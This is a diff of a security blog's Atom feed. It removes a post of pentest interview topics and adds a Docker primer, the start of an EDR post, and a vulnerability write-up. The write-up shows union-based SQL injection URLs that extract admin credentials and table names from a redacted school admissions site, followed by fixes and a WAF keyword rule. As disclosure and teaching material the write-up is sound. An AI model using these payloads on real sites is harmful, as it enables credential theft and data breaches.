@@ -8,217 +8,271 @@
     <author>
       <name>ZhIE</name>
     </author>
-    <updated>2026-06-11T16:00:00.000Z</updated>
+    <updated>2026-07-24T16:00:00.000Z</updated>
     <entry>
-        <id>https://adm1n10086.github.io/2026/06/12/%E9%9D%A2%E8%AF%95%E8%A6%81%E6%B1%82/</id>
-        <title>实习要求</title>
-        <link rel="alternate" href="https://adm1n10086.github.io/2026/06/12/%E9%9D%A2%E8%AF%95%E8%A6%81%E6%B1%82/"/>
-        <content type="html">&lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
-&lt;p&gt;该文章总结各个岗位我所看见的，所遇见的，所听过的岗位要求：&lt;/p&gt;
-&lt;h2 id=&#34;apt攻击手法是什么有哪些&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apt攻击手法是什么有哪些&#34;&gt;#&lt;/a&gt; APT攻击手法是什么，有哪些&lt;/h2&gt;
-&lt;h2 id=&#34;熟悉常见外网打点技术及内外攻击技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#熟悉常见外网打点技术及内外攻击技术&#34;&gt;#&lt;/a&gt; 熟悉常见外网打点技术及内外攻击技术&lt;/h2&gt;
-&lt;p&gt;（一）资产测绘与信息搜集（前置打点基础）&lt;br /&gt;
-外网打点技术，资产测绘与信息搜集&lt;br /&gt;
-域名资产探测&lt;br /&gt;
-子域名爆破、DNS 解析查询、旁站 / C 段查询、备案反查、证书透明度 CT 日志爬取、二级 / 三级域名遍历。&lt;br /&gt;
-端口 &amp;amp; 服务测绘&lt;br /&gt;
-Masscan、Nmap 全端口扫描，识别公网开放端口：80/443 (Web)、22 (SSH)、3389 (RDP)、3306 (MySQL)、5432 (Postgres)、6379 (Redis)、8080/8443 中间件、VPN (4433/1723)、防火墙管理口。&lt;br /&gt;
-指纹识别&lt;br /&gt;
-Web 中间件（Tomcat、WebLogic、JBoss、Nexus、Apache、IIS）、OA/ERP/ 协同系统（泛微、致远、用友、金蝶）、VPN（深信服、天融信、Forti）、路由防火墙、打印机、监控设备、Git/SVN 代码仓库。&lt;br /&gt;
-OSINT 开源情报&lt;br /&gt;
-官网公告、招聘、员工邮箱、GitHub/Gitee 泄露源码、网盘泄露配置、第三方平台泄露账号、供应商信息。&lt;br /&gt;
-（二）Web 服务漏洞打点（最主流外网入口）&lt;br /&gt;
-通用 Web 漏洞&lt;br /&gt;
-SQL 注入、XSS 跨站、文件上传、文件包含、目录遍历、SSRF、命令执行、逻辑越权、未授权访问、弱口令后台。&lt;br /&gt;
-中间件漏洞&lt;br /&gt;
-WebLogic 反序列化、Tomcat 弱口令 / 后门、Shiro 反序列化、Fastjson、Struts2、Nexus 未授权、Jenkins 命令执行。&lt;br /&gt;
-专用业务系统漏洞&lt;br /&gt;
-OA 漏洞、致远 / 泛微任意文件上传 / 命令执行、Exchange ProxyLogon/ProxyShell、Confluence RCE、通达后台漏洞、企业邮箱漏洞。&lt;br /&gt;
-（三）端口服务弱口令 &amp;amp; 未授权打点&lt;br /&gt;
-数据库：Redis 未授权访问、MySQL/MSSQL 弱口令、Mongo 未授权、Elasticsearch 未授权漏洞。&lt;br /&gt;
-远程管理：SSH 弱口令、RDP 爆破、VNC 无密码、WinRM 未授权。&lt;br /&gt;
-缓存 / 消息队列：Redis 写 Webshell、RabbitMQ 弱口令、Kafka 未授权。&lt;br /&gt;
-代码仓库：Git/SVN 泄露源码、Gogs/GitLab 弱口令、未授权访问。&lt;br /&gt;
-（四）边界设备专项打点&lt;br /&gt;
-SSL VPN/IPSec VPN：弱口令、漏洞 RCE、验证码绕过、短信验证码爆破、Cookie 伪造。&lt;br /&gt;
-防火墙、负载均衡：管理后台弱口令、命令执行、后台未授权。&lt;br /&gt;
-路由器、摄像头、打印机：固件漏洞、默认账号、远程命令执行。&lt;br /&gt;
-（五）钓鱼类外网打点（APT 高频）&lt;br /&gt;
-鱼叉钓鱼邮件：伪造合作伙伴、法务、招标，宏 Office、恶意 LNK、PDF 漏洞、钓鱼站点。&lt;br /&gt;
-仿站钓鱼：仿 VPN、OA、企业邮箱登录页窃取账号密码。&lt;br /&gt;
-社交钓鱼：企业微信、钉钉、LinkedIn 定向发送恶意文件 / 链接。&lt;br /&gt;
-（六）供应链第三方打点&lt;br /&gt;
-攻击厂商、外包系统、开源组件投毒，利用企业对外采购的工具、更新服务器实现外网入口。&lt;/p&gt;
-&lt;h1 id=&#34;我个人简历可能会问到的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#我个人简历可能会问到的问题&#34;&gt;#&lt;/a&gt; 我个人简历可能会问到的问题：&lt;/h1&gt;
-&lt;p&gt;一、基础个人 &amp;amp; 教育类问题（开场必问）&lt;br /&gt;
-简单做一下自我介绍。&lt;br /&gt;
-你为什么选择信息安全这个专业？&lt;br /&gt;
-在校绩点专业前 5%，平时是怎么平衡专业课学习和实战练习的？&lt;br /&gt;
-你目前大四 / 在读，课余时间主要深耕网络安全哪一块方向？&lt;br /&gt;
-籍贯河南，为什么考虑来我们城市 / 公司工作？&lt;br /&gt;
-二、专业技能类问题（技术核心考察）&lt;/p&gt;
-&lt;p&gt;讲讲 OWASP TOP10 包含哪些漏洞，你最擅长哪几类？&lt;/p&gt;
-&lt;p&gt;详细说下SQL 注入的&lt;mark&gt;原理&lt;/mark&gt;、&lt;mark&gt;分类&lt;/mark&gt;、利用方式和防御手段？&lt;/p&gt;
-&lt;p&gt;你如果已经SQL注入成功了，结下来你怎么做&lt;/p&gt;
-&lt;p&gt;XSS 跨站脚本有哪几种类型？各自怎么触发、如何修复？&lt;br /&gt;
-CSRF 漏洞的成因是什么？和 XSS 有什么区别？常用防御方案？&lt;br /&gt;
-文件上传漏洞的绕过思路有哪些？日常如何防护？&lt;br /&gt;
-命令执行漏洞一般出现在什么场景，如何检测和防御？&lt;/p&gt;
-&lt;p&gt;完整的渗透测试流程&lt;/p&gt;
-&lt;details class=&#34;primary&#34;&gt;&lt;summary&gt;完整的渗透测试流程&lt;/summary&gt;&lt;div&gt;
-&lt;p&gt;请你简单描述一次渗透测试的完整流程，尤其是你在项目中如何规划每一步的。&lt;br /&gt;
-一次完整的渗透测试通常从信息收集开始，我会使用工具收集目标的所有公开信息，如IP地址、域名、端口等。接&lt;br /&gt;
-下来，我会进行漏洞扫描，寻找常见的漏洞，如SQL注入、XSS等。发现漏洞后，我会尝试利用这些漏洞获取系&lt;br /&gt;
-统控制权，并通过权限提升获取更高的权限。最后，我会通过设置后门等方法实现持久化访问。&lt;br /&gt;
-整个流程不仅需要技术支持，还要根据目标的安全防护策略灵活调整渗透方式，确保在不被发现的情况下达成目&lt;br /&gt;
-标。&lt;/p&gt;
-&lt;/div&gt;&lt;/details&gt;
-&lt;p&gt;RCE&lt;/p&gt;
-&lt;p&gt;条件竞争漏洞原理与举例&lt;/p&gt;
-&lt;details class=&#34;primary&#34;&gt;&lt;summary&gt;条件竞争&lt;/summary&gt;&lt;div&gt;
-&lt;p&gt;条件竞争（Race Condition）漏洞原理 + 实例&lt;br /&gt;
-一、核心原理&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;基础概念&lt;br /&gt;
-条件竞争漏洞（Race condition）官方概念是“发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。” 这个漏洞存在于操作系统、数据库、web等多个层面，像有名的脏牛（dirty cow）。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;标准不安全流程（存在竞争窗口）：&lt;br /&gt;
-判断资源状态（如判断文件不存在 if(!file_exists(&amp;quot;/tmp/tmp.txt&amp;quot;))）&lt;br /&gt;
-间隔时间窗口（几毫秒，并发可精准利用）&lt;br /&gt;
-执行操作（创建文件、写入、删除、权限修改）&lt;br /&gt;
-漏洞本质：校验和操作非原子化，中间存在可被利用的时间间隙。&lt;br /&gt;
-2. 关键前提&lt;br /&gt;
-共享资源可被多请求同时访问；&lt;br /&gt;
-校验逻辑与修改逻辑分离，无原子锁；&lt;br /&gt;
-攻击者可控请求并发速度，精准卡在时间窗口操作资源。&lt;/p&gt;
-&lt;/div&gt;&lt;/details&gt;
-&lt;p&gt;宽字节注入&lt;/p&gt;
-&lt;p&gt;反序列化&lt;/p&gt;
-&lt;p&gt;说一下并发漏洞&lt;/p&gt;
-&lt;p&gt;简述你的职业规划&lt;/p&gt;
-&lt;p&gt;简述shiro反序列化&lt;/p&gt;
-&lt;p&gt;对称加密与非对称加密、&lt;/p&gt;
-&lt;p&gt;Python 反弹shell&lt;/p&gt;
-&lt;p&gt;Linux如果有一个挖矿病毒，你会如何做；如果有一个勒索病毒，你如何做&lt;/p&gt;
-&lt;p&gt;你有什么想问面试官的吗&lt;/p&gt;
-&lt;p&gt;信息收集的方式&lt;/p&gt;
-&lt;details class=&#34;primary&#34;&gt;&lt;summary&gt;信息收集的方式&lt;/summary&gt;&lt;div&gt;
-&lt;p&gt;信息收集方式（渗透测试/网络安全通用）&lt;br /&gt;
-一、公开渠道被动信息收集（Passive，不触碰目标服务器）&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;域名&amp;amp;备案信息&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;WHOIS查询：注册人、手机号、邮箱、注册时间、DNS服务器&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;工信部备案：企业名称、法人、备案地址、关联域名&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;企查查/天眼查：企业工商信息、股东、分支机构、关联公司、联系方式&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;DNS信息收集&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;DNS解析记录：A、AAAA、CNAME、MX、TXT、NS记录&lt;/li&gt;
-&lt;li&gt;子域名挖掘：证书透明度CT日志、搜索引擎、第三方子域名库&lt;/li&gt;
-&lt;li&gt;反向DNS、DNS区域传送漏洞&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ol start=&#34;3&#34;&gt;
-&lt;li&gt;搜索引擎爬取&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;百度、谷歌、搜狗语法：site、inurl、filetype、intitle&lt;/li&gt;
-&lt;li&gt;遗留备份文件：.bak、.sql、.zip、.log、后台地址、源码泄露&lt;/li&gt;
-&lt;li&gt;公开招聘网站：服务器架构、中间件、开发语言、内网设备信息&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ol start=&#34;4&#34;&gt;
-&lt;li&gt;
-&lt;p&gt;第三方平台数据&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;网络空间测绘：Shodan、FOFA、Censys，查IP端口、设备型号、banner&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;代码托管平台：GitHub/Gitee/GitLab，搜索公司关键词找泄露源码、密钥、数据库地址&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;社交平台：微信公众号、微博、知乎、企业群，获取员工姓名、工号、邮箱、内部系统名称&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;历史快照：Wayback Machine网页存档，查看下线旧页面、后台路径&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;证书、邮件、爬虫数据&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;SSL证书：获取域名列表、企业名称&lt;/li&gt;
-&lt;li&gt;邮箱搜集：公开新闻、招聘、官网底部，整理员工邮箱用于钓鱼、爆破&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;二、主动信息收集（Active，直接和目标网络交互）&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;主机存活探测&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;ICMP：ping、arping（内网）&lt;/li&gt;
-&lt;li&gt;TCP/UDP端口扫描：Nmap、Masscan，探测开放端口、服务版本、操作系统&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ol start=&#34;2&#34;&gt;
-&lt;li&gt;端口与服务识别&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;抓取Banner：识别Apache、Nginx、Tomcat、MySQL、Redis、FTP等版本&lt;/li&gt;
-&lt;li&gt;漏洞匹配：根据服务版本对应CVE漏洞&lt;/li&gt;
-&lt;li&gt;弱口令探测：FTP、SSH、3389、数据库、后台管理端口&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ol start=&#34;3&#34;&gt;
-&lt;li&gt;
-&lt;p&gt;Web站点信息探测&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;目录扫描：Dirsearch、Dirmap、御剑，扫描后台、上传、备份、管理页面&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;指纹识别：CMS（织梦、ThinkPHP、Shiro、SpringBoot）、前端框架、中间件&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;爬虫遍历全站：获取接口、参数、页面功能、文件上传点、登录入口&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;工具探测：AWVS、Xray、Nessus自动化爬取站点资产&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;内网信息收集（拿到权限后）&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;网段扫描、ARP扫描、路由、网关、DHCP服务器&lt;/li&gt;
-&lt;li&gt;域信息：域控、域用户、共享文件夹、组策略、内网数据库&lt;/li&gt;
-&lt;li&gt;本机信息：操作系统版本、进程、服务、账户、浏览器密码、配置文件&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;三、社工类信息收集（社会工程学）&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;公开社交信息：员工朋友圈、抖音、脉脉，收集姓名、生日、手机号、部门&lt;/li&gt;
-&lt;li&gt;钓鱼：伪造邮件/二维码/登录页面，诱导输入账号密码、上传文件&lt;/li&gt;
-&lt;li&gt;电话社工：伪装运维、快递、厂商套取内网地址、账号、服务器密码&lt;/li&gt;
-&lt;li&gt;线下：公司海报、工牌、办公文档、废弃打印纸获取内部信息&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;四、其他辅助收集手段&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;流量抓包：Wireshark、Burp抓HTTP/HTTPS请求，获取接口、Cookie、参数&lt;/li&gt;
-&lt;li&gt;流量镜像/日志：服务器访问日志、防火墙日志，分析访问IP、路径&lt;/li&gt;
-&lt;li&gt;APP/小程序抓包：反编译、抓接口，获取后端域名、API密钥&lt;/li&gt;
-&lt;li&gt;第三方泄露库：社工库、泄露数据库，查询泄露账号密码、手机号&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/div&gt;&lt;/details&gt;
+        <id>https://adm1n10086.github.io/2026/07/25/SRC%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%A3%81%E5%8E%BF%E6%8B%9B%E7%94%9FSQL%E6%B3%A8%E5%85%A5/</id>
+        <title>某招生网站存在sql注入</title>
+        <link rel="alternate" href="https://adm1n10086.github.io/2026/07/25/SRC%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%A3%81%E5%8E%BF%E6%8B%9B%E7%94%9FSQL%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;p&gt;某中专招生网存在SQL注入导致数据库完全泄露&lt;br /&gt;
+信息收集到网站&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/images/SRC/1.1.1.png&#34; alt=&#34;0&#34; /&gt;&lt;br /&gt;
+cd参数为空时&lt;br /&gt;
+直接报错：&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/images/SRC/1.1.2.png&#34; alt=&#34;0&#34; /&gt;&lt;br /&gt;
+构造&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/images/SRC/1.1.3.png&#34; alt=&#34;0&#34; /&gt;&lt;br /&gt;
+构造Payload：&lt;br /&gt;
+cd=-6 union select 1,2,3,4-- -&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/images/SRC/1.1.4.png&#34; alt=&#34;0&#34; /&gt;&lt;br /&gt;
+发现报错&lt;br /&gt;
+改为&lt;br /&gt;
+cd=-6 union select 1,2,3,4,5--&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/images/SRC/1.1.5.png&#34; alt=&#34;0&#34; /&gt;&lt;br /&gt;
+页面正常返回&lt;br /&gt;
+说明Union注入成功&lt;br /&gt;
+提取数据库版本：&lt;br /&gt;
+&lt;a href=&#34;http://xxxxxx.com.cn/newslist.php?cd=-6%20union%20select%201,version(),3,4,5--%20-&#34;&gt;http://xxxxxx.com.cn/newslist.php?cd=-6 union select 1,version(),3,4,5-- -&lt;/a&gt;&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/images/SRC/1.1.6.png&#34; alt=&#34;0&#34; /&gt;&lt;br /&gt;
+获取管理员凭据：&lt;br /&gt;
+&lt;a href=&#34;http://xxx.com.cn/newslist.php?cd=-6%20union%20select%201,group_concat(username,&#39;:&#39;,password),3,4,5%20from%20ql_user--%20-&#34;&gt;http://xxx.com.cn/newslist.php?cd=-6 union select 1,group_concat(username,&#39;:&#39;,password),3,4,5 from ql_user-- -&lt;/a&gt;&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/images/SRC/1.1.7.png&#34; alt=&#34;0&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;列出所有表名&lt;br /&gt;
+&amp;quot;&lt;a href=&#34;http://xxxxxx.com.cn/newslist.php?cd=-6%20union%20select%201,group_concat(table_name),3,4,5%20from%20information_schema.tables%20where%20table_schema=database()--%20-&#34;&gt;http://xxxxxx.com.cn/newslist.php?cd=-6 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()-- -&lt;/a&gt;&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/images/SRC/1.1.8.png&#34; alt=&#34;0&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;具体危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#具体危害&#34;&gt;#&lt;/a&gt; 具体危害&lt;/h1&gt;
+&lt;p&gt;危害①：管理员密码泄漏 → 后台沦陷&lt;br /&gt;
+危害②：会员个人身份信息批量泄露&lt;br /&gt;
+危害③：root 权限可读取服务器文件&lt;br /&gt;
+危害④：完整的学生学籍成绩外泄等&lt;/p&gt;
+&lt;h1 id=&#34;修复方案&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修复方案&#34;&gt;#&lt;/a&gt; 修复方案&lt;/h1&gt;
+&lt;p&gt;参数化查询	将 $cd = &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mtext&gt;改为&lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_GET[&amp;#x27;cd&amp;#x27;] 改为 intval(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0019em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3283em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;ET&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7519em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7519em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;改为&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET[&#39;cd&#39;]) 或使用 PDO 参数绑定&lt;br /&gt;
+严格数字校验	if (!is_numeric($cd)) exit(&#39;非法参数&#39;);&lt;br /&gt;
+最小权限原则	Web 应用禁止使用 root 连接数据库，创建专用账号仅授予 SELECT INSERT UPDATE DELETE 权限&lt;br /&gt;
+隐藏错误信息	关闭 display_errors，不将 SQL 错误直接回显给用户&lt;br /&gt;
+WAF规则	在 Nginx/Apache 层面对包含 union select、information_schema 等敏感关键词的请求拦截&lt;/p&gt;
+&lt;p&gt;本次测试声明：&lt;/p&gt;
+&lt;p&gt;测试目标：&lt;a href=&#34;http://xxxx.com.cn/%EF%BC%88%E9%9D%9E%E7%94%9F%E4%BA%A7%E6%80%A7%E5%95%86%E4%B8%9A%E7%B3%BB%E7%BB%9F%EF%BC%8C%E5%B1%9E%E4%BA%8E%E6%95%99%E8%82%B2/%E6%8B%9B%E7%94%9F%E7%B1%BB%E4%BF%A1%E6%81%AF%E5%8F%91%E5%B8%83%E5%B9%B3%E5%8F%B0%EF%BC%89&#34;&gt;http://xxxx.com.cn/（非生产性商业系统，属于教育/招生类信息发布平台）&lt;/a&gt;&lt;br /&gt;
+测试范围：仅通过 SQL 注入语句读取数据库结构信息和脱敏统计数据&lt;br /&gt;
+未执行的操作：❌ 未修改/删除任何数据 ❌ 未下载文件 ❌ 未尝试登录后台 ❌ 未进行拒绝服务攻击 ❌ 未横向移动 ❌ 未植入后门/木马 ❌ 未对第三方造成影响&lt;br /&gt;
+测试人员无恶意目的，发现的漏洞已如实记录，不向第三方披露、不用于非法获利&lt;br /&gt;
+建议厂商收到后及时修复，即可消除风险&lt;/p&gt;
 </content>
         <category term="网络安全" scheme="https://adm1n10086.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
-        <category term="个人实习" scheme="https://adm1n10086.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%AE%9E%E4%B9%A0/" />
-        <updated>2026-06-11T16:00:00.000Z</updated>
+        <updated>2026-07-24T16:00:00.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://adm1n10086.github.io/2026/07/24/docker%E5%AE%B9%E5%99%A8/</id>
+        <title>Docker &amp;kubernetes！</title>
+        <link rel="alternate" href="https://adm1n10086.github.io/2026/07/24/docker%E5%AE%B9%E5%99%A8/"/>
+        <content type="html">&lt;h1 id=&#34;docker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker&#34;&gt;#&lt;/a&gt; docker&lt;/h1&gt;
+&lt;h2 id=&#34;docker简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker简介&#34;&gt;#&lt;/a&gt; Docker简介：&lt;/h2&gt;
+&lt;p&gt;Docker是一个用于构建 运行 传送应用程序的平台&lt;br /&gt;
+&lt;strong&gt;Docker 是容器化工具&lt;/strong&gt;，核心作用：把应用 + 依赖（库、配置、运行环境）打包成&lt;strong&gt;容器镜像&lt;/strong&gt;。&lt;br /&gt;
+&lt;strong&gt;一次打包，到处运行&lt;/strong&gt;。同一个 Docker 镜像，在开发机、服务器、云环境运行效果完全一致，解决 “本地能跑，线上崩” 的环境问题。&lt;/p&gt;
+&lt;h2 id=&#34;docker与虚拟机的区别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker与虚拟机的区别&#34;&gt;#&lt;/a&gt; docker与虚拟机的区别&lt;/h2&gt;
+&lt;h3 id=&#34;虚拟机vm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟机vm&#34;&gt;#&lt;/a&gt; 虚拟机（VM）&lt;/h3&gt;
+&lt;p&gt;依托 Hypervisor（虚拟机监视器） 实现硬件虚拟化，每个实例搭载独立完整操作系统与内核，资源隔离基于硬件层级，资源开销高，镜像容量大，启动速度慢。&lt;/p&gt;
+&lt;h3 id=&#34;docker-容器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker-容器&#34;&gt;#&lt;/a&gt; Docker 容器&lt;/h3&gt;
+&lt;p&gt;属于操作系统级虚拟化，直接复用宿主机操作系统内核，仅封装应用程序及其依赖组件，依托 Linux 内核特性实现进程隔离，开销极低，镜像体积小，秒级启动。&lt;/p&gt;
+</content>
+        <category term="网络安全" scheme="https://adm1n10086.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
+        <updated>2026-07-23T16:00:00.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://adm1n10086.github.io/2026/07/14/EDR/</id>
+        <title>安服仔要懂得EDR</title>
+        <link rel="alternate" href="https://adm1n10086.github.io/2026/07/14/EDR/"/>
+        <content type="html">&lt;h1 id=&#34;前提&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前提&#34;&gt;#&lt;/a&gt; 前提：&lt;/h1&gt;
+&lt;p&gt;0day防护，有一个非常重要的动作：&lt;strong&gt;加强主机安全防护&lt;/strong&gt; ——增加安全设备的部署（主流是EDR和HIDS&amp;lt;主机入侵检测系统&amp;gt;）&lt;/p&gt;
